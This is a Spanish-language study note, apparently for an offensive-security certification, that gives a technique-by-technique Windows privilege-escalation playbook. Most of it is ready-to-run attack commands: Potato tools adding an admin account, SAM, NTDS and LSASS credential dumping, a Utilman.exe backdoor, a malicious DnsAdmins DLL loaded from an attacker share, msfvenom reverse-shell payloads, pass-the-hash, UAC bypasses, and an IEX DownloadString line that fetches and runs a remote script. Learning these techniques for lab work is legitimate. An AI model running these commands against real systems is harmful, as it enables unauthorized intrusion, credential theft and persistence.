# 04 — Escalada de privilegios en Windows

Tenés shell, sos usuario común, querés `Administrator` / `SYSTEM`.

> **Para el paso a paso de enumeración** (procesos, servicios, tareas programadas, registro,
> credenciales) y la **post-explotación para añadir un administrador**, ver
> [`LPE-Windows.md`](lpe/LPE-Windows.md). Esta nota es la **referencia profunda por técnica**.

> **Antes de empezar**: una shell de `cmd` en una reverse shell suele ser inestable. Si tenés
> `SeImpersonatePrivilege` o credenciales, `evil-winrm` o WinRM te dan una shell mucho mejor.
> Ver `02-enumeracion-servicios.md` → 5985.

---

## 0. Enumeración — no te saltees este paso

```cmd
whoami /all
whoami /priv
whoami /groups
hostname
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

```powershell
# Con PowerShell a mano
[System.Environment]::OSVersion
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
Get-Process | Select-Object Name,Id,Path
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"}
```

### Automatizado

```powershell
# winPEAS
.\winPEASx64.exe

# PowerUp (PowerSploit)
. .\PowerUp.ps1
Invoke-AllChecks

# PrivescCheck — buena alternativa, más silencioso
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended
```

> **PowerUp — CONFIRMADO**: usalo **solo para chequear** (`Invoke-AllChecks`). **No** uses sus
> funciones de abuso (`Invoke-ServiceAbuse`, `Write-UserAddMSI`, …): hacé la explotación **a mano**.

**Marcá lo que `whoami /priv` te da.** La mitad de las escaladas de Windows se reducen a
qué privilegio tenés habilitado.

---

## 1. Privilegios de token — el vector más directo

```cmd
whoami /priv
```

### `SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege` → familia Potato

Es el vector **más común** y da `SYSTEM` directo. Si tenés cualquiera de los dos, casi seguro
sos `SYSTEM`.

> **Detalle de elección, compatibilidad y binarios de cada Potato**: `../cheatsheets/potatoes.md`.
> La regla práctica es **GodPotato primero**, luego **PrintSpoofer**; Rogue/Juicy solo si
> conocés la versión de Windows y el requisito extra aplica.

| Herramienta | Windows objetivo | Requisito extra |
| --- | --- | --- |
| **GodPotato** | Server 2012–2022, Win 8–11 | .NET 4+ — **el más amplio, empezá por acá** |
| **PrintSpoofer** | Win 10, Server 2016/2019 | Spooler activo |
| **RoguePotato** | Server 2019, Win 10 1809+ | Redireccionador (`socat`) en tu Kali |
| **JuicyPotato** | Win 7/8/10 ≤1809, Server ≤2016 | CLSID válido para esa versión |
| **SweetPotato** | Combina varios | |
| **SharpEfsPotato** | Amplio | Vía EFSRPC |

```cmd
:: GodPotato — sin dependencias externas ni redireccionador
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c net user hacker P@ss123 /add && net localgroup administrators hacker /add"

:: PrintSpoofer
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "cmd /c net localgroup administrators user /add"

:: JuicyPotato (necesita CLSID correcto para la versión; buscar en la lista pública de CLSIDs)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net localgroup administrators user /add" -t *
```

> **`SeImpersonatePrivilege` aparece típicamente en**: cuentas de servicio IIS (`iis apppool\`),
> MSSQL service account, y cualquier proceso que corra bajo una cuenta de servicio. Si tu
> foothold fue un servidor web o MSSQL, revisá esto **primero**.

### `SeBackupPrivilege` / `SeRestorePrivilege`

Permite leer cualquier archivo, incluidos los que no deberías. Suele venir con el grupo
`Backup Operators`.

```cmd
:: Copiar SAM y SYSTEM con robocopy en modo backup
robocopy /b C:\Windows\System32\config\SAM C:\Temp\ SAM
robocopy /b C:\Windows\System32\config\SYSTEM C:\Temp\ SYSTEM
:: Después, en tu Kali:
:: secretsdump.py -sam SAM -system SYSTEM LOCAL
```

En un **Domain Controller** con `SeBackupPrivilege` esto escala a compromiso total del dominio:
copiás `NTDS.dit` y el `SYSTEM` hive, y tenés todos los hashes del dominio.

### `SeTakeOwnershipPrivilege`

Te permite tomar propiedad de cualquier objeto, incluyendo archivos de sistema.

```cmd
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant <USER>:F
copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
:: Después: en la pantalla de login, Win+U abre cmd como SYSTEM
```

### `SeDebugPrivilege`

Te permite inyectar en cualquier proceso, incluido LSASS.

```cmd
:: Dump de LSASS con procdump
procdump.exe -accepteula -ma lsass.exe lsass.dmp
:: En tu Kali:
:: pypykatz lsa minidump lsass.dmp
```

### `SeLoadDriverPrivilege`

Cargar un driver firmado con vulnerabilidad conocida (típicamente `Capcom.sys`). Más raro
en labs modernos. También lo tiene el grupo **Print Operators**.

### `SeManageVolumePrivilege`

Permite manipular el volumen directamente. Con `SeManageVolumeExploit.exe` se obtiene acceso
escritura a `C:\` como usuario normal (y desde ahí, reemplazar un binario que corra como SYSTEM).

```cmd
SeManageVolumeExploit.exe
```

### `SeCreateTokenPrivilege` y `SeTcbPrivilege` (raros)

- **`SeCreateTokenPrivilege`**: permite crear un token con SIDs arbitrarios → fabricar un token
  con el grupo `Administrators`. Delicado de usar a mano.
- **`SeTcbPrivilege`** ("act as part of the OS"): bypass de autenticación y creación de tokens.
  Muy raro, pero si aparece es SYSTEM.

---

## 1b. Grupos de Windows que dan escalada

No solo los privilegios escalan: pertenecer a ciertos **grupos** es un camino directo.

| Grupo | Cómo da SYSTEM / DA |
| --- | --- |
| **Backup Operators** | `SeBackupPrivilege`/`SeRestorePrivilege` → robar SAM/SYSTEM, o NTDS.dit en un DC |
| **Server Operators** | modificar/crear servicios, logon local, backup → reemplazar binario de servicio |
| **Account Operators** | crear/modificar cuentas y grupos (salvo admins) → agregar usuario a un grupo con poder |
| **Print Operators** | `SeLoadDriverPrivilege` → driver vulnerable (`Capcom.sys`) → SYSTEM |
| **DnsAdmins** | cargar una DLL como servicio DNS en el DC → RCE como SYSTEM |
| **Exchange Windows Permissions** | normalmente con `WriteDacl` sobre el dominio → DCSync |
| **Organization Management** | grupo de Exchange con privilegios muy altos |
| **Hyper-V Administrators** | acceso a discos/archivos de las VMs; si el DC está virtualizado → DA |

### DnsAdmins → SYSTEM en el DC

```cmd
:: Requiere dnscmd y una DLL maliciosa servida desde tu Kali
dnscmd <DC> /config /serverlevelplugindll \\<TU_IP>\share\evil.dll
:: El servicio DNS debe reiniciarse para cargar el plugin
sc \\<DC> stop dns
sc \\<DC> start dns
```

Generá la DLL con `msfvenom -p windows/x64/shell_reverse_tcp ... -f dll`.

### Backup Operators → SAM/SYSTEM

```cmd
robocopy /b C:\Windows\System32\config\SAM    C:\Temp\ SAM
robocopy /b C:\Windows\System32\config\SYSTEM C:\Temp\ SYSTEM
:: En tu Kali:
:: impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

---

## 2. Servicios mal configurados

```cmd
:: Rutas y permisos de servicios
sc query state= all
wmic service get name,displayname,pathname,startmode,startname | findstr /i "auto"

:: Permisos sobre el binario del servicio
icacls "C:\ruta\del\servicio.exe"

:: Con PowerUp (detecta todo esto automáticamente)
. .\PowerUp.ps1
Invoke-AllChecks
```

### 2a. Rutas sin comillas

Si la ruta tiene espacios y **no** está entre comillas, Windows intenta ejecutar en orden:

```text
C:\Program Files\Algo Con Espacio\servicio.exe
→ C:\Program.exe
→ C:\Program Files\Algo.exe
→ C:\Program Files\Algo Con Espacio\servicio.exe
```

Si podés escribir en cualquiera de los intermedios, plantás tu binario.

```cmd
:: Detectar
wmic service get name,pathname | findstr /i /v "\""
```

```cmd
:: Explotar: crear el .exe en la ruta intermedia que puedas escribir
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f exe -o Program.exe
:: Subirlo a C:\Program.exe y reiniciar el servicio
sc stop <servicio> && sc start <servicio>
```

### 2b. Permisos débiles sobre el binario

```cmd
icacls "C:\ruta\servicio.exe"
```

Si tu usuario tiene `(F)` o `(M)` sobre el ejecutable: lo reemplazás y reiniciás el servicio.

```cmd
sc stop <servicio>
copy /y C:\Temp\payload.exe "C:\ruta\servicio.exe"
sc start <servicio>
```

### 2c. `service` configurable por tu usuario

```powershell
# Con PowerUp
Get-ModifiableService
Get-ModifiableServiceFile
```

### 2d. Rutas de DLL

```cmd
:: Ver directorios de carga de DLL de un servicio
wmic service get name,pathname
:: Si un servicio carga una DLL que no existe desde un directorio escribible → plantarla
```

> Herramienta cómoda: **`accesschk.exe`** de Sysinternals.
> `accesschk.exe -uwcqv "Users" *` para ver servicios que `Users` puede modificar.

---

## 3. AlwaysInstallElevated

Si las **dos** claves están en `1`, cualquier usuario puede instalar un MSI como `SYSTEM`.
Es escalada inmediata.

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Las dos** tienen que devolver `0x1`. Si solo una está, no funciona.

```bash
# Generar el MSI malicioso en tu Kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f msi -o evil.msi
```

```cmd
msiexec /quiet /qn /i C:\Temp\evil.msi
```

---

## 4. Autoruns y tareas programadas

```cmd
:: Registro — programas que arrancan solos
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

**Qué buscar**: una entrada apuntando a un ejecutable **escribible**. Lo reemplazás y esperás
el próximo arranque o login.

```powershell
# Tareas programadas con PowerUp
. .\PowerUp.ps1
Get-ScheduledTask
Get-ModifiableScheduledTaskFile
```

```cmd
schtasks /query /fo LIST /v | findstr /i "TaskName Run"
```

**Qué buscar**: tarea que corre como `SYSTEM` **ejecutando un binario o script que vos podés editar**.

---

## 5. Credenciales almacenadas

```cmd
:: Bóveda de credenciales
cmdkey /list
:: Si hay credenciales guardadas, ejecutá algo COMO esa credencial:
runas /savecred /user:Administrator "cmd /c whoami"
```

```powershell
# Buscar credenciales en el registro (GPP)
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts" /s
findstr /S /I cpassword \\<DC>\sysvol\<dominio>\Policies\*.xml
```

**GPP `cpassword`** — una clave que fue publicada por Microsoft. Se descifra con:

```bash
# En tu Kali
gpp-decrypt <CPASSWORD>
# O directamente:
Get-GPPPassword.py dominio.local/user:pass@<DC>
nxc smb <DC> -u user -p pass -M gpp_password
nxc smb <DC> -u user -p pass -M gpp_autologin
```

### Archivos de instalación desatendida

```cmd
dir /s /b C:\ | findstr /i "unattend.xml sysprep.xml sysprep.inf unattend.txt"
```

Suelen tener la contraseña del administrador local **en texto plano o base64**.

### Configuraciones con credenciales

```powershell
# web.config, archivos de conexión a base de datos
Get-ChildItem -Path C:\ -Include web.config,*.config,*.xml -Recurse -ErrorAction SilentlyContinue |
  Select-String -Pattern "password|passwd|pwd" -ErrorAction SilentlyContinue
```

---

## 6. Credenciales — de shell a compromiso

### Dump de SAM y LSA (local, requiere Administrador o SYSTEM)

```cmd
:: Con NetExec, desde tu Kali (si sos admin local)
/usr/bin/nxc smb <IP> -u user -p pass --sam
/usr/bin/nxc smb <IP> -u user -p pass --lsa
/usr/bin/nxc smb <IP> -u user -p pass --local-auth --sam --lsa
```

```bash
# Con Impacket
secretsdump.py usuario:clave@<IP>
secretsdump.py -hashes :<NThash> usuario@<IP>
```

### Shadow Snapshots — dump remoto sin tocar los hives en vivo

Truco moderno: creás un **Shadow Copy** por WMI y accedés a `SAM`/`SYSTEM`/`SECURITY` por SMB
vía el formato de *versión anterior* (`@GMT-...`), **sin ejecutar código en la víctima**.

```bash
# Automatizado — Impacket lo trae desde 2024
impacket-secretsdump -use-remoteSSMethod './Administrator:pass@<IP>'
# Flags: -remoteSS-remote-volume (default C:\), -remoteSS-local-path (default .)
```

A mano:

```cmd
wmic /node:<IP> /user:<USER> /password:<PASS> shadowcopy call create Volume='C:\'
vssadmin list shadows
```

```bash
# Acceder a la ruta @GMT-<fecha UTC> por SMB y bajar SAM/SYSTEM/SECURITY
```

> Deja un Shadow Copy creado; borralo al terminar (`wmic shadowcopy delete`) para no ensuciar
> el entorno. Requiere credenciales de admin con acceso WMI.

### Pass-the-Hash

Una vez tenés el hash NTLM, no necesitás la contraseña:

```bash
evil-winrm -i <IP> -u Administrator -H <NThash>
/usr/bin/nxc smb <IP> -u Administrator -H <NThash>
impacket-psexec -hashes :<NThash> Administrator@<IP>
```

Ver `05-active-directory.md` para Pass-the-Hash dentro del dominio.

---

## 7. UAC (si sos Administrador local pero con token filtrado)

Si `whoami /groups` muestra `Administrators` pero con **"Medium Mandatory Level"**, tu token
está filtrado por UAC. Necesitás un bypass de UAC para tener token completo.

- **`fodhelper.exe`** — el más usado en labs (auto-eleva sin prompt).
- **`computerdefaults.exe`**, **`sdclt.exe`**, **`eventvwr.exe`** — variantes.

```powershell
# Con el módulo UACME / bypass de PowerUp
Invoke-AllChecks   # detecta si tenés token filtrado
```

> UAC bypass **no** es escalada de privilegios si no estás en `Administrators`. Si no sos miembro,
> UAC no te ayuda en nada.

---

## 8. Exploits de kernel

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe get Captcha,HotFixID,InstalledOn
```

**Qué buscar**: parches faltantes. Los clásicos:

| CVE | Nombre | Afecta |
| --- | --- | --- |
| CVE-2021-34527 | PrintNightmare | Spooler sin parchear |
| CVE-2020-1472 | Zerologon | Domain Controller (ver `05`) |
| CVE-2019-0708 | BlueKeep | RDP en versiones viejas |
| CVE-2016-0099 | MS16-032 | Win 7–10 secundario |
| CVE-2024-26229 | CSSC (Windows CSP) | Win 10/11, Server 2022 — elevación local |
| CVE-2019-1388 | UAC bypass (certificado) | Win 7–10 — `hhupd.exe` abre navegador elevado |

```bash
# En tu Kali: sugeridor de exploits
windows-exploit-suggester.py --database 2023-*.xls --systeminfo systeminfo.txt
```

> Mismo consejo que en Linux: probá **primero configuración** (privilegios, servicios, credenciales).
> El exploit de kernel puede tumbar la máquina y quemarte un revert.

---

## Orden de ataque — resumen ejecutivo

```text
1. whoami /all + whoami /priv       ← 10 segundos. Define todo lo demás.
2. SeImpersonatePrivilege           ← Potato → SYSTEM. El más común si el foothold fue web/MSSQL.
2b. Grupos peligrosos              ← Backup/Server/Account/Print Operators, DnsAdmins, Hyper-V
3. Servicios mal configurados       ← rutas sin comillas, binarios escribibles
4. Credenciales almacenadas         ← cmdkey, GPP, unattend.xml, configs
5. AlwaysInstallElevated            ← instantáneo si está activo
6. Tareas programadas / autoruns    ← archivos escribibles ejecutados por SYSTEM
7. SeBackupPrivilege                ← SAM/SYSTEM, o NTDS.dit en un DC
8. Dump de SAM/LSA                  ← solo si ya sos admin local
9. UAC bypass                       ← solo si ya sos Administrador local
10. Kernel exploit                  ← ÚLTIMO. Riesgo de crashear.
```

---

## Herramientas a tener listas (bajalas ANTES del examen)

| Herramienta                                               | Uso                                                       |
| --------------------------------------------------------- | --------------------------------------------------------- |
| `winPEASx64.exe`                                          | Enumeración automática                                    |
| `PowerUp.ps1`                                             | Servicios, tareas, autoruns, AlwaysInstallElevated        |
| `PrivescCheck.ps1`                                        | Alternativa más silenciosa                                |
| `GodPotato.exe` / `PrintSpoofer64.exe`                    | SeImpersonate → SYSTEM (ver `../cheatsheets/potatoes.md`) |
| `RoguePotato.exe` / `JuicyPotato.exe` / `SweetPotato.exe` | Potatoes alternativos según versión                       |
| `SeManageVolumeExploit.exe`                               | `SeManageVolumePrivilege` → escribir en `C:\`             |
| `SharpUp.exe` / `Seatbelt.exe`                            | Enumeración de escalada y del host                        |
| `accesschk.exe`                                           | Permisos de servicios y archivos                          |
| `procdump.exe`                                            | Dump de LSASS                                             |
| `winPEAS.bat`                                             | Fallback sin PowerShell                                   |

Si `evil-winrm` te sirve los archivos desde tu Kali, esto se simplifica mucho:

```bash
evil-winrm -i <IP> -u user -p pass -e /opt/privesc-tools   # -e = exes, -s = scripts
# Y adentro:
# *Evil-WinRM* PS> menu
```

---

## Diferencias clave con Linux

| Aspecto | Linux | Windows |
| --- | --- | --- |
| Vector #1 | `sudo -l` / SUID | `whoami /priv` → SeImpersonate |
| Herramienta estrella | linpeas + GTFOBins | winPEAS + PowerUp |
| Baseline automática | Correr linpeas sin drama | **PowerShell encendido suele ser mejor**, pero ojo con AMSI y logging |
| Riesgo de crashear | Exploit de kernel | Exploit de kernel, PrintNightmare mal usado |
| Si sos admin local | — | UAC puede bloquear: necesitás bypass |

**AVISO sobre AMSI y antivirus**: en máquinas de practice de OffSec suele **no** haber AV agresivo,
pero si PowerShell falla con errores raros, la causa más probable es AMSI. Alternativas:
`-enc`, ofuscación, o usar el binario `.exe` en vez del script `.ps1`.

```powershell
# Test rápido de si AMSI está bloqueando
IEX (New-Object Net.WebClient).DownloadString('http://<TU_IP>:8000/PowerUp.ps1')
# Si falla silenciosamente, AMSI te bloqueó.
```
